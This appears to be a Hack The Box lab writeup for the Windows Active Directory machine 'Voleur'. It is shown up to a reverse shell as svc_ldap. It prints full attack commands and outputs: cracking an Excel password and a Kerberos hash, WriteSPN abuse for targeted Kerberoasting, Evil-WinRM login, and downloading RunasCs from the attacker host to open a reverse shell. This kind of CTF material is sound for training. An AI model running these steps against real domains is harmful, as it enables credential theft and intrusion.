---
Category: HTB/Machines/Windows
tags:
  - HTB
  - Machine
  - Windows
  - Medium
  - ProtectedExcelDocument
  - JohnTheRipper
  - Hash
  - Cracking
  - ActiveDirectory
  - Kerberos
  - AccessControlLists
  - ACL
  - AccessControlEntries
  - ACE
  - WriteSPN
  - targetedKerberoast
  - ActiveDirectoryTombstones
  - DataProtectionAPI
  - DPAPI
  - WindowsSubsystemForLinux
  - WSL
---

![](images/Voleur.png)

## Table of Contents

- [Summary](#Summary)
- [Introduction](#Introduction)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Domain Enumeration](#Domain-Enumeration)
    - [Configuring Kerberos Realm](#Configuring-Kerberos-Realm)
    - [Synchronizing Time and Date](#Synchronizing-Time-and-Date)
    - [Requesting Kerberos Ticket](#Requesting-Kerberos-Ticket)
    - [Enumeration of Port 445/TCP](#Enumeration-of-Port-445TCP)
- [Cracking the Password of the Excel Document using John the Ripper](#Cracking-the-Password-of-the-Excel-Document-using-John-the-Ripper)
- [Investigating Excel Document](#Investigating-Excel-Document)
- [Active Directory Configuration Dump](#Active-Directory-Configuration-Dump)
- [Foothold](#Foothold)
- [Privilege Escalation to SVC_WINRM](#Privilege-Escalation-to-SVC_WINRM)
    - [Access Control Entry (ACE) WriteSPN Abuse and Targeted Kerberoast](#Access-Control-Entry-ACE-WriteSPN-Abuse-and-Targeted-Kerberoast)
    - [Cracking the Kerberos Ticket](#Cracking-the-Kerberos-Ticket)
    - [Configuring Kerberos Realm in /etc/krb5.conf](#Configuring-Kerberos-Realm-in-etckrb5conf)
- [user.txt](#usertxt)
- [Enumeration (svc_winrm)](#Enumeration-svc_winrm)
- [Privilege Escalation back to SVC_LDAP](#Privilege-Escalation-back-to-SVC_LDAP)
- [Enumeration (SVC_LDAP)](#Enumeration-SVC_LDAP)
- [Privilege Escalation to Todd.Wolfe](#Privilege-Escalation-to-ToddWolfe)
    - [Active Directory Tombstones](#Active-Directory-Tombstones)
- [Enumeration (Todd.Wolfe)](#Enumeration-ToddWolfe)
- [Privilege Escalation to jeremy.combs](#Privilege-Escalation-to-jeremycombs)
    - [Data Protection API (DPAPI)](#Data-Protection-API-DPAPI)
- [Enumeration (jeremy.combs)](#Enumeration-jeremycombs)
- [Privilege Escalation to svc_backup](#Privilege-Escalation-to-svc_backup)
- [Enumeration (svc_backup)](#Enumeration-svc_backup)
- [Privilege Escalation to SYSTEM](#Privilege-Escalation-to-SYSTEM)
- [root.txt](#roottxt)
- [Post Exploitation](#Post-Exploitation)

## Summary

The box starts with a classic of an `readable SMB Share` on port `445/TCP` which contains a `Excel Document` that is `password protected`. This share can be accessed by any `First-Line Support` member. After `cracking` the `password` the file contains a lot of `usernames` and `passwords` as well as information about a `deleted user` which comes into play later in the box.

The first step of `Privilege Escalation` is to abuse the `Access Control Entry (ACE)` of `WriteSPN` which leads to `Targeted Kerberoast` of a user and to `Footold` on the box and to the `user.txt`.

From within the session it is necessary to spawn a shell as the user `SVC_LDAP` which initially was used in the `WriteSPN` abuse since this user is also member of the `RESTORE_USERS` group that allows to recover the `Active Directory Tombstone` of the `deleted user` for further `Privilege Escalation`.

Now the recovered user is member of the `Second-Line Support` group which has access to the equally named directory on the `SMB Share` that contains a folder called `Archived Users`. Inside the folder relevant files and folders used by the `Data Protection API (DPAPI)` can be found. After `decrypting` the `Data Blob` offline and manually, some `credentials` can be found to access the `third` and `last` of the directories on the share called `Third-Line Support`.

This directory contains a `SSH Private Key` which can be used as the `SVC_BACKUP` user on port `2222/TCP` granting access to a `Windows Subsystem for Linux (WSL)` instance that has mounted the `C-Drive` for backup purposes.

As last step the `Backups` folder of the `C-Drive` needs to be accessed from within the `WSL` instance to download the `SYSTEM` and `ntds.dit` files which can be `decrypted` to gain access to the `Hash` of `Administrator` and finally to the the `root.txt.`

## Introduction

As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: `ryan.naylor / HollowOct31Nyt`

## Reconnaissance

### Port Scanning

When we finished our initial `port scan` using `Nmap` we spotted port a custom port `2222/TCP` open running `SSH`.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.197.35
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 21:02 CEST
Nmap scan report for 10.129.197.35
Host is up (1.2s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-06 03:05:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-07-06T03:05:54
|_  start_date: N/A
|_clock-skew: 7h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 252.25 seconds
```

### Domain Enumeration

While the port scan was running we fired up `enum4linux-ng` as usual but using the given `credentials` to add the name of the `Domain` as well as the name of the `Domain Controller (DC)` to our `/etc/hosts` file.

```shell
┌──(kali㉿kali)-[~/opt/01_information_gathering/enum4linux-ng]
└─$ python3 enum4linux-ng.py 10.129.197.35 -u 'ryan.naylor' -p 'HollowOct31Nyt'
ENUM4LINUX - next generation (v1.3.1)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.197.35
[*] Username ......... 'ryan.naylor'
[*] Random Username .. 'prdydeis'
[*] Password ......... 'HollowOct31Nyt'
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.129.197.35    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    Domain Information via LDAP for 10.129.197.35    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: voleur.htb

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.197.35    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on 10.129.197.35    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false                                                                                                                                                                                                                            
SMB signing required: true                                                                                                                                                                                                                  

 ============================================================
|    Domain Information via SMB session for 10.129.197.35    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[-] Could not enumerate domain information via unauthenticated SMB
[*] Enumerating via unauthenticated SMB session on 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ==========================================
|    RPC Session Check on 10.129.197.35    |
 ==========================================
[*] Check for null session
[-] Could not establish null session: STATUS_NOT_SUPPORTED
[*] Check for user session
[-] Could not establish user session: STATUS_NOT_SUPPORTED
[*] Check for random user
[-] Could not establish random user session: STATUS_NOT_SUPPORTED
[-] Sessions failed, neither null nor user sessions were possible

 ================================================
|    OS Information via RPC for 10.129.197.35    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: unknown                                                                                                                                                                                                                                 
OS version: not supported                                                                                                                                                                                                                   
OS release: null                                                                                                                                                                                                                            
OS build: null                                                                                                                                                                                                                              
Native OS: not supported                                                                                                                                                                                                                    
Native LAN manager: not supported                                                                                                                                                                                                           
Platform id: null                                                                                                                                                                                                                           
Server type: null                                                                                                                                                                                                                           
Server type string: null                                                                                                                                                                                                                    

[!] Aborting remainder of tests since sessions failed, rerun with valid credentials

Completed after 14.82 seconds
```

Since we didn't got the name of `DC` in the output, we simply guessed it at this point and verified it later.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.197.35   voleur.htb
10.129.197.35   dc.voleur.htb
```

### Configuring Kerberos Realm

We quickly figured out that `NTLM Authentication` was deactivated for this box why we created a `custom krb5.conf` and exported it to our shell in order to work with `Kerberos Realms` on `Kali`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ cat krb5.conf 
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = true
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    forwardable = true

[realms]
    VOLEUR.HTB = {
        kdc = dc.voleur.htb
        admin_server = dc.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ export KRB5_CONFIG="krb5.config"
```

### Synchronizing Time and Date

We preemptively `synchronized` the `Time and Date` of our local machine with the `DC` to not run into any troubles later.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo /etc/init.d/virtualbox-guest-utils stop
Stopping virtualbox-guest-utils (via systemctl): virtualbox-guest-utils.service.
```

```shell
┌──(kali㉿kali)-[~]
└─$ sudo /etc/init.d/virtualbox-guest-utils stop
Stopping virtualbox-guest-utils (via systemctl): virtualbox-guest-utils.service.
```

```shell
┌──(kali㉿kali)-[~]
└─$ sudo net time set -S 10.129.197.35
```

### Requesting Kerberos Ticket

Then we requested a `Kerberos Ticket` for the given user `ryan.naylor` to interact with the `DC` and the `Domain`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ impacket-getTGT voleur.htb/ryan.naylor:HollowOct31Nyt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.naylor.ccache
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ export KRB5CCNAME=ryan.naylor.ccache
```

### Enumeration of Port 445/TCP

We usually start by enumerating port `445/TCP` in detail but since this box had some issues with the response times, we decided to use the `spider_plus` module of `NetExec` with the `--dns-timeout` flag to simply download whatever files we were allowed to access.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --use-kcache -M spider_plus -o DOWNLOAD_FLAG=true --dns-timeout 10
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] VOLEUR.HTB\ryan.naylor from ccache 
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Started module spidering_plus with the following options:
SPIDER_PLUS dc.voleur.htb   445    dc               [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS dc.voleur.htb   445    dc               [*]     STATS_FLAG: True
SPIDER_PLUS dc.voleur.htb   445    dc               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS dc.voleur.htb   445    dc               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS dc.voleur.htb   445    dc               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS dc.voleur.htb   445    dc               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share 
SPIDER_PLUS dc.voleur.htb   445    dc               [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/dc.voleur.htb.json".
SPIDER_PLUS dc.voleur.htb   445    dc               [*] SMB Shares:           8 (ADMIN$, C$, Finance, HR, IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS dc.voleur.htb   445    dc               [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS dc.voleur.htb   445    dc               [*] SMB Filtered Shares:  1
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Total folders found:  27
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Total files found:    7
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size average:    3.55 KB
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size min:        22 B
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size max:        16.5 KB
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File unique exts:     5 (xlsx, csv, ini, inf, pol)
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Downloads successful: 7
SPIDER_PLUS dc.voleur.htb   445    dc               [+] All files processed successfully.
```

In the case of this box this was just one `Excel Document` which we moved to our working directory.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ mv /home/kali/.nxc/modules/nxc_spider_plus/dc.voleur.htb/IT/First-Line\ Support/Access_Review.xlsx .
```

## Cracking the Password of the Excel Document using John the Ripper

The `Excel Document` was `Password protected` for which we used `office2john` to generate a `Hash` which we could `crack` using `John the Ripper`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ office2john Access_Review.xlsx > access_review_xlsx.hash
```

After a few seconds we got the `password` for the file.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ sudo john access_review_xlsx.hash --wordlist=/usr/share/wordlists/rockyou.txt 
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:03 DONE (2025-07-06 05:37) 0.3021g/s 241.6p/s 241.6c/s 241.6C/s football1..martha
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Password  |
| --------- |
| football1 |

## Investigating Excel Document

The document contained a lot of information about various users as well as their corresponding `passwords` and a very crucial information about a `deleted user`, which we kept in the back of our heads for later.

![](images/2025-07-06_05-38_excel_file_content.png)

```shell
User    Job Title    Permissions    Notes
Ryan.Naylor    First-Line Support Technician    SMB    Has Kerberos Pre-Auth disabled temporarily to test legacy systems.
Marie.Bryant    First-Line Support Technician    SMB    
Lacey.Miller    Second-Line Support Technician    Remote Management Users    
Todd.Wolfe    Second-Line Support Technician    Remote Management Users    Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.
Jeremy.Combs    Third-Line Support Technician    Remote Management Users.    Has access to Software folder.
Administrator    Administrator    Domain Admin    Not to be used for daily tasks!
            
            
Service Accounts            
svc_backup         Windows Backup    Speak to Jeremy!
svc_ldap        LDAP Services    P/W - M1XyC9pW7qT5Vn
svc_iis        IIS Administration    P/W - N5pXyW1VqM7CZ8
svc_winrm        Remote Management     Need to ask Lacey as she reset this recently.
```

## Active Directory Configuration Dump

Now it was time to `dump` the `configuration` of the `Active Directory` using `NetExec` and the flag for `BloodHound`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ netexec ldap 10.129.197.35 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --bloodhound --dns-tcp --dns-server 10.129.197.35 -c all --dns-timeout 10
LDAP        10.129.197.35   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        10.129.197.35   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
LDAP        10.129.197.35   389    DC               Resolved collection methods: trusts, dcom, container, psremote, group, session, acl, rdp, objectprops, localadmin
LDAP        10.129.197.35   389    DC               Using kerberos auth without ccache, getting TGT
[05:17:20] ERROR    Unhandled exception in computer DC.voleur.htb processing: The NETBIOS connection with the remote host timed out.                                                                                        computers.py:268
LDAP        10.129.197.35   389    DC               Done in 00M 31S
LDAP        10.129.197.35   389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.129.197.35_2025-07-06_051648_bloodhound.zip
```

## Foothold
## Privilege Escalation to SVC_WINRM

### Access Control Entry (ACE) WriteSPN Abuse and Targeted Kerberoast

After we imported the files to `BloodHound` we saw that our user was member of a group called `FIRST-LINE TECHNICIANS`.

![](images/2025-07-06_05-22_bloodhound_ryan_naylor_group_permissions.png)

To make sure not to miss any useful `description`, we used `NetExec` once more to read all of them, which gave us some insights in the structure of the support teams.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ netexec ldap 10.129.197.35 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -M get-desc-users
LDAP        10.129.197.35   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        10.129.197.35   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
GET-DESC... 10.129.197.35   389    DC               [+] Found following users: 
GET-DESC... 10.129.197.35   389    DC               User: Administrator description: Built-in account for administering the computer/domain
GET-DESC... 10.129.197.35   389    DC               User: Guest description: Built-in account for guest access to the computer/domain
GET-DESC... 10.129.197.35   389    DC               User: krbtgt description: Key Distribution Center Service Account
GET-DESC... 10.129.197.35   389    DC               User: ryan.naylor description: First-Line Support Technician
GET-DESC... 10.129.197.35   389    DC               User: marie.bryant description: First-Line Support Technician
GET-DESC... 10.129.197.35   389    DC               User: lacey.miller description: Second-Line Support Technician
GET-DESC... 10.129.197.35   389    DC               User: jeremy.combs description: Third-Line Support Technician
```

We noticed the first possibility of a `Privilege Escalation` by abusing the `Access Control Entry (ACE)` of `WriteSPN` on `SVC_WINRM` by the user `SVC_LDAP` which lead us to `Targeted Kerberoast`.

![](images/2025-07-06_05-52_bloodhound_svc_ldap_outbound_object_control.png)

To start our attack we used the newly found `credentials` to request a `Kerberos Ticket` as `SVC_LDAP` and exported it.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ impacket-getTGT voleur.htb/svc_ldap:M1XyC9pW7qT5Vn   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ export KRB5CCNAME=svc_ldap.ccache
```

Then we wrote a `Service Principal Name (SPN)` to the user `SVC_WINRM` by using `bloodyAD`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ bloodyAD --host dc.voleur.htb --dc-ip 10.129.197.35 -d voleur.htb -k set object 'SVC_WINRM' servicePrincipalName -v 'cifs/SVC_WINRM'
[+] SVC_WINRM's servicePrincipalName has been updated
```

Next to bring a little mix in our tooling we utilized the `--kerberoast` flag of `NetExec` to catch a `roastable Kerberos Ticket`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ netexec ldap dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --kerberoast hashes.kerberoast
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
LDAP        dc.voleur.htb   389    DC               [*] Skipping disabled account: krbtgt
LDAP        dc.voleur.htb   389    DC               [*] Total of records returned 1
LDAP        dc.voleur.htb   389    DC               [*] sAMAccountName: svc_winrm, memberOf: CN=Remote Management Users,CN=Builtin,DC=voleur,DC=htb, pwdLastSet: 2025-01-31 10:10:12.398769, lastLogon: 2025-01-29 16:07:32.711487
LDAP        dc.voleur.htb   389    DC               $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb\svc_winrm*$16fd1dc71b9c29f2f045bcf4a905537a$4822966d85accbdcf1744845a3f994f14cfca2a0a9ca3cb15b75b1a8b6391155622b0f3fe4518a5765d3d02a03ff1746cdf9dffcf7cad90f212ac21a7ed691d6a9782bb0a5481e78da79c7989f8d771480bd19a0a3b7c4a8f3eb3fed20dc821d82d89abf7dcb85eeca917aadab370e47428c80fe05898cf4917f381ac6a1d391edd1baf9dc6a3fe74f8ff69d77990af23f2f8b7604c8cb151e7e1b9f8d61dd52aac16de7f44069bef3459cb7e1b318106c0981c328bfb82a29c5191018251c5c35b02d08d7df1ea12a8c40e3b990b6e3bd4ff8ee7cd723d6dadc870b54af4ff6abea4a7d5435f1e0b61f8dc136b6fc62d5bd88d08c8e0d0f0fe03601421b3ff6a8fa92a69e33f56525603971955b605fe71765db31943aeb6d6b1e8fd950580e76ee54cbaf838d94ec5c311acd88e9e05257e7cceb8a850a2869df718827e9f0aefd21a714410bb2b99f3fba713903ddc24e5e1ccc0457291a96e42ed5d8eb1580bf1d6fe4ea8b32cd5289387d3911d38a16fa9c2b56d6abff5a6cd1f149e0853b193441bc794b659459bb59d4de6a28f490b86ac391562e20dbb72ce4c536a4a57507d51feb126fada31fc5c4f7245b8ee23cbab9bf6962e707e0c12701e48f603f5d1fa2cf2b99aae68e4b7d10766902a3928a4fb51d1b715d27bd8e2000d1fc49c4923b7b2610367fbfd3d286cae625ed1b7e1b096d8a2aa182b53924662ff63d005ba6bc68e6a840221ce936623a55d7ff54a93f3c02682a89eb8db9ef0ef9780205d48b76e7bc4f28222e4be301f0e82452ac1cf295f3a3ca09c4eaf5e115a9698417bdbb17f8bff0d207c847c01ff147515c35f31c46864b4680865dc1dc339e7e01314d1966c718f0e1d59425e8945cfc9f2e3f4a128a706a45200b59d053f088cff5f267d45081f9bf72bb1a7adb7db55fe746c6496043505ceb14b915d0ca78b3634ccc170d6a8c414dd84b29a4399f7fdef537f5eb7001c39e2f7a248f3dbf155ce97ab0b83a7ea3455d76bc4900d54ec0daf76e2bf1ecadec221f69711fd0a2365a2c6719d8e688af9d8ef41e78f195008b38c376d8ca5c10086cb95df2b187b40bf8d7af2a2ce87a20e9bd89b30c83f1ca8e54771982228e21f2f900174c42eb46f2b52cad75700d84c1c9c8c22e4783445ec3a5a1726a610cbcaa7c371b440aeb321d8c6602ebec57ad532f0ee732bc240ac2e34ecdead9beeceb5dfe34fbaccb9038b1cbfd3fe59c7a88966db289481bb61322d9e624924dc6bf1c7e4983155eb0822505e7dc5968e701f81af2929c9e0850c95d66a3fd06687a3e99c0c686cc1fcb232c0526c85c90292810fc24959c66834fe468c19e9e4fbe87a191ae277133594b770de01a69ca2a82b2e5c3e717fd8b9850f4cc817b4d2b87c83d596b44be7fbf6a20ad994b83a90a47d4b6d51e2871f8981538c54b85c0e5f6c7d46845b41a5cca46eec69881d699b7e9a34046e1edd7a8956ef22b5507aa2884bec02f421d341d2e248681be2bb1aef215c7
```

### Cracking the Kerberos Ticket

We cracked the `Kerberos Ticket` using `John the Ripper` one more time and moved on to finalize this privesc.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ sudo john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt 
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
AFireInsidedeOzarctica980219afi (?)     
1g 0:00:00:06 DONE (2025-07-06 06:00) 0.1584g/s 1818Kp/s 1818Kc/s 1818KC/s AHANACK6978012..AFITA4162
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Configuring Kerberos Realm in /etc/krb5.conf

Since our plan was to use `Evil-WinRM` to get a `Foothold` on the box, we needed to modify the actual `/etc/kr5.conf` file because `Evil-WinRM` does not use `custom Kerberos Realms` by default.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/krb5.conf
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = true
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    forwardable = true

[realms]
    VOLEUR.HTB = {
        kdc = dc.voleur.htb
        admin_server = dc.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

To make things a bit easier we opened a new terminal which had not the previous `krb5.conf` file exported to, requested and exported a fresh ticket but this time as `SVC_WINRM`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ impacket-getTGT voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ export KRB5CCNAME=svc_winrm.ccache
```

And without any problems we were able to login to the box and to grab the `user.txt` using the configured `Kerberos Realm` within `Evil-WinRM`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Voleur/files]
└─$ evil-winrm -i dc.voleur.htb -u svc_winrm -r voleur.htb   
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents>
```

## user.txt

```cmd
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
f6e8d03bd5ca6fbc49415a859561eab5
```

## Enumeration (svc_winrm)

With the user of `SVC_WINRM` we performed the enumeration as usual but didn't find any interesting permissions. So we moved on.

```cmd
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
voleur\svc_winrm S-1-5-21-3927696377-1337352550-2781715495-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

## Privilege Escalation back to SVC_LDAP

We knew from our initial investigation in `BloodHound` that `SVC_LDAP` also was member of the group `RESTORE_USERS` which combined with the information from the `Excel Document` indicated the presence of `Active Directory Tombstones`.

To verify that we needed a `session` as `SVC_LDAP`. The easiest way for us to achieve that was to use `RunasCS` and simply spawn a shell.

- [https://github.com/antonioCoco/RunasCs](https://github.com/antonioCoco/RunasCs)

```cmd
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> iwr 10.10.16.35/RunasCs.exe -o RunasCs.exe
```

```cmd
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn cmd.exe -r 10.10.16.35:4444
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-254c8a$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 4944 created in background.
```

```shell
